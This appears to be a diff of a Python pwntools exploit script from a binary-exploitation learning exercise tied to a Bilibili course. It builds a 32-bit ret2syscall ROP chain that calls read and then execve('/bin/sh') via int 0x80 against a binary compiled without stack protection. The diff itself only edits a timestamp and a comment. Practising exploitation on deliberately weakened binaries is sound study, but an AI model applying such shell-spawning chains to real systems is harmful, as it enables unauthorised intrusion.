@@ -1,7 +1,7 @@
 '''
 Author: 白银
 Date: 2023-01-02 17:00:47
-LastEditTime: 2023-01-02 20:03:49
+LastEditTime: 2023-01-02 20:12:56
 LastEditors: 白银
 Description: gcc question_5_test9_syscall.c -m32 -fno-stack-protector -no-pie -static -o question_5_x86_test9_syscall  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=4296.1&p=23
 Attention: ret2syscall
@@ -60,7 +60,7 @@ payload = flat(['a' * padding])
 # 执行 read(0, bin_ssh_addr, 0)  rax = 3, ebx = 0, ecx = bin_ssh_addr, edx = 8
 payload += flat([pop_eax_ret, bin_ssh_addr, mov_ecx_eax_ret, pop_eax_ret, 3, pop_ebx_ret, 0, pop_edx_ret, 8, int0x80_addr]) # 3是32位read的中断位
 # 执行 execve('/bin/sh', 0, 0)  rax = 11, ebx = bin_ssh_addr, ecx = , edx = 0
-payload += flat([pop_eax_ret, 0, mov_ecx_eax_ret, pop_eax_ret, 11, pop_ebx_ret, bin_ssh_addr, pop_edx_ret, 0, int0x80_addr]) # 每两个一组进行类似赋值操作，后数字给前，从最后开始数，上同，x64同
+payload += flat([pop_eax_ret, 0, mov_ecx_eax_ret, pop_eax_ret, 11, pop_ebx_ret, bin_ssh_addr, pop_edx_ret, 0, int0x80_addr]) # 每两个一组进行类似赋值操作，后数字给前，从最后开始数，上同
 
 delimiter = 'input:'
 
